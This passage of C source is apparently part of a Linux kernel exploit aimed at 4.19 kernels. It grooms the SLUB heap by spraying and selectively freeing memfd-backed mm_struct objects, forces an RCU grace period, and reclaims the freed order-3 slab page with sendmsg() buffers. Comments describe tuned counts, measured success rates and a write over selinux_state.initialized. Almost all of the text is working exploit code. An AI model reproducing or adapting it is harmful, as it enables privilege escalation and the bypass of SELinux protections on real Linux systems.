   * unfreeze_partials(). */
  int spray_free_after = 1;
#else
  int spray_free_after = 0;
#endif
#ifdef GHOSTLOCK_TARGET_4_19
  /* Selective prepost keeps one object alive on each order-3 neighbour of the
   * leak slab so those neighbours cannot be freed and coalesced with it, while
   * still emptying the leak slab itself.  This is required for the leak page
   * to stay a standalone order-3 block until the immediate send grabs it. */
  int selective = 1;
  if (selective) {
    /* The leak slab is the order-3 page that must stay free.  If its order-3
     * buddy is also free, __free_pages() merges it upward and the order-3
     * send never reaches it.  pre_ctx and post_ctx are allocated directly
     * around the leak, so their slabs are usually the two buddies.  Empty the
     * leak slab (free only the pre/post objects that live on it), but keep the
     * other pre/post slabs allocated as guard pages until after the send. */
    size_t obj_sz = 0x3c0;
    size_t off = (size_t)((leaked - base) / obj_sz);
    if (off >= mm_objs_per_slab) off = mm_objs_per_slab - 1;
    /* The spray allocation count is a multiple of objs_per_slab, so pre_ctx
     * starts on a slab boundary: its 33 objects plus the leak fill the leak
     * slab, and post_ctx starts the next slab.  Free all pre objects to empty
     * the leak slab, but keep the final post object.  That last post object is
     * on the next slab and pins the leak page's order-3 buddy, preventing the
     * empty leak page from merging upward when it is finally freed. */
    pr_info("[spray] selective leak_off=%zu keep_pre0 keep_post=%zu\n",
            off, post_ctx.mm_cnt - 1);
    /* Free a few whole spray slabs before touching the leak slab.  Emptying
     * whole slabs raises n->nr_partial to min_partial, so the first free on
     * the leak slab is frozen into the CPU partial list with drain=1 instead
     * of being parked on the node partial.  The later unfreeze_partials()
     * pass then discards the empty leak slab to the buddy allocator.  The
     * last spray slab and the pre/post slabs stay allocated as guard pages
     * around the leak page. */
    /* The old pre-close tricks are kept only as opt-in tuning knobs.  The
     * reliable sequence keeps the CPU-partial list short before the leak
     * close, then frees one object in every untouched prepare/spray slab
     * afterwards (see the post-leak block below). */
    size_t spare_slabs = 0;
    size_t spray_slabs = spray_ctx.mm_cnt / mm_objs_per_slab;
    if (spare_slabs + 1 > spray_slabs) spare_slabs = spray_slabs - 1;
    pr_info("[spray] selective spare_full_slabs=%zu/%zu\n",
            spare_slabs, spray_slabs);
    for (size_t s = 0; s < spare_slabs; s++) {
      for (size_t j = 0; j < mm_objs_per_slab; j++) {
        size_t i = s * mm_objs_per_slab + j;
        if (spray_ctx.memfds[i] > 0) {
          SYSCHK(close(spray_ctx.memfds[i]));
          spray_ctx.memfds[i] = -1;
        }
      }
    }
    /* Keep pre[0] as well: when pre_ctx started in a partially used slab,
     * pre[0] lives in the slab *before* the leak slab and pins the leak
     * page's other order-3 buddy.  The leak slab itself holds pre[1..] when
     * pre started at a slab boundary, and those are freed below. */
    for (size_t i = 1; i < pre_ctx.mm_cnt; i++) {
      if (pre_ctx.memfds[i] > 0) {
        SYSCHK(close(pre_ctx.memfds[i]));
        pre_ctx.memfds[i] = -1;
      }
    }
    for (size_t i = 0; i + 1 < post_ctx.mm_cnt; i++) {
      if (post_ctx.memfds[i] > 0) {
        SYSCHK(close(post_ctx.memfds[i]));
        post_ctx.memfds[i] = -1;
      }
    }
    if (spray_free_after) {
      /* Free one object in a few more spray slabs before the leak close.
       * Those frees are queued on the same RCU list *before* the leak object
       * and their put_cpu_partial() pass exceeds cpu_partial, so the resulting
       * unfreeze_partials() moves the leak slab (inuse == 1, the leak object)
       * to the node partial list.  The leak's own RCU callback then runs with
       * was_frozen == 0 and nr_partial >= min_partial, which discards the
       * empty slab immediately instead of leaving it frozen on the CPU
       * partial list until after the send. */
      /* 17 is the smallest count that reliably pushed nr_partial over
       * min_partial on this 4.19 target.  Keep it as the default; the old
       * tests used 6 and the leak slab often stayed frozen. */
      size_t pre_free = 17;
      size_t done = 0;
      for (size_t s = spare_slabs;
           s < spare_slabs + pre_free && s < spray_slabs; s++) {
        size_t i = s * mm_objs_per_slab;
        if (spray_ctx.memfds[i] > 0) {
          SYSCHK(close(spray_ctx.memfds[i]));
          spray_ctx.memfds[i] = -1;
          done++;
        }
      }
      pr_info("[spray] pre_leak_spray_frees=%zu\n", done);
    }
  } else {
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      SYSCHK(close(pre_ctx.memfds[i]));
      pre_ctx.memfds[i] = -1;
    }
    /* The leak child sits between pre and post in allocation order, but the
     * mm slab may already have had k free slots when pre started.  In that
     * case the leak slab also holds post[0..33-k], so keeping any post object
     * alive can pin the exact page we need to reclaim.  Free all of them; the
     * one-per-slab spray frees below still provide the CPU-partial drain fuel
     * and keep enough non-empty slabs in the node partial list for the leak
     * slab to be discarded instead of cached. */
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      SYSCHK(close(post_ctx.memfds[i]));
      post_ctx.memfds[i] = -1;
    }
  }
#else
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
#endif
  /* The one-object-per-spray-slab frees happen after close(memfd_leak).
   * See the comment at the leak close below. */
  if (!spray_free_after) {
    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
      if (spray_ctx.memfds[i] > 0) {
        SYSCHK(close(spray_ctx.memfds[i]));
        spray_ctx.memfds[i] = -1;
      }
    }
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  {
    int pages = 0;
#ifdef GHOSTLOCK_TARGET_4_19
    /* 20k order-3 sends drain both the Normal and DMA32 order-3/4/5 free
     * lists, so the leak page's order-3 buddy is allocated before the leak
     * slab is discarded and cannot merge the leak into order-4.  Measured
     * 5/5 reclaims with this value; the old 0/512 defaults left the buddy
     * free and the immediate send almost always missed. */
    pages = 20000;
#endif
    if (pages > 0) guard_spray_order3(pages);
  }
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  if (spray_free_after) {
    /* The leak slab is frozen in the CPU-partial list when its last object is
     * freed, so __slab_free() only updates counters and never discards the
     * empty order-3 slab.  Free one object in every untouched spray slab now:
     * each is a first free on a full slab and freezes it on the CPU-partial
     * list.  Once the list exceeds cpu_partial (13 objects on 4.19),
     * unfreeze_partials() runs.  The spray slabs are newer than the leak slab
     * and stay partially allocated (33 objects in use), so they are moved to
     * the node partial list first, raising nr_partial above min_partial; the
     * empty leak slab is then discarded to the buddy allocator.  The leak page
     * is the only order-3 page freed, and the immediate sendmsg() below takes
     * it from the buddy free list. */
    size_t spray_slabs = spray_ctx.mm_cnt / mm_objs_per_slab;
    size_t frozen = 0;
    for (size_t s = 0; s < spray_slabs; s++) {
      size_t i = s * mm_objs_per_slab;
      if (spray_ctx.memfds[i] > 0) {
        SYSCHK(close(spray_ctx.memfds[i]));
        spray_ctx.memfds[i] = -1;
        frozen++;
      }
    }
    pr_info("[spray] post-leak freeze slabs=%zu/%zu\n", frozen, spray_slabs);
    /* Do not fflush/fsync here.  close(memfd_leak) just put the leak page on
     * the buddy free list and the immediate sendmsg() below must be the very
     * next order-3 allocation.  An fsync takes milliseconds and lets another
     * order-3 allocation (usually a kernel stack) steal the page.  The line
     * stays in the stdio buffer and is flushed after the reclaim sends. */
  }
  /* close(memfd_leak) only queues the final mm_free_rcu callback.  Without a
   * grace period the leak slab is still allocated when the first sendmsg()
   * runs and the send can never reuse it.  MEMBARRIER_CMD_GLOBAL performs
   * synchronize_sched() on 4.19, which waits for exactly the grace period
   * that invokes the queued callbacks.  Do this after the freeze-spray frees
   * (also RCU callbacks) so the leak slab is the last empty slab discarded. */
  rcu_force_grace();
  int reclaim_sends = SKB_RECLAIM_SENDS;
  int reclaim_sent = 0;
  {
    /* close(memfd_leak) drops the final mm_users reference: __mmput() and the
     * kmem_cache_free() of the leak object run synchronously in this syscall,
     * and __free_slab() discards the empty order-3 slab to the buddy allocator
     * right there (the pre-close spray frees already pushed nr_partial past
     * min_partial).  The buddy free lists are LIFO, so the first order-3 frag
     * allocation after this point reuses the leak page.  Any spin or other
     * allocation in between lets an unrelated order-3 allocation steal it. */
    for (int i = 0; i < reclaim_sends; i++) {
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
      if (sent <= 0) {
        break;
      }
      reclaim_sent++;
    }
    pr_info("[spray] immediate reclaim sends=%d/%d errno=%d\n",
            reclaim_sent, reclaim_sends, errno);
    /* Safe to flush now: the leak page has either been claimed by one of the
     * sends or lost; further allocations can no longer affect the reclaim. */
    log_sync();
  }
  guard_release();
  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(void) {
  int max_attempts = 12;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  deadline.tv_sec += 240;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    /* Don't let a rejected page become the scan anchor for the next try: it
     * is not the controlled mm, so a window starting there misses the real
     * one and every later leak comes back -1. */
    uintptr_t anchor_before = last_mm_struct;
    uintptr_t base = prepare_kernel_page();
    if (base) {
      /* W1 stores this page address, so the word's byte 2 lands on
       * selinux_state.initialized. an even byte there fails every SID lookup */
      if (pselect_custom_write == 1 && pselect_child_node &&
          ((fake_right >> 16) & 1) == 0) {
        last_mm_struct = anchor_before;
        pr_warning("page %016zx stores an even byte over "
                   "selinux_state.initialized; taking another\n", (size_t)base);
      } else {
        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
                ms_since(&t_good));
        return base;
      }
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}
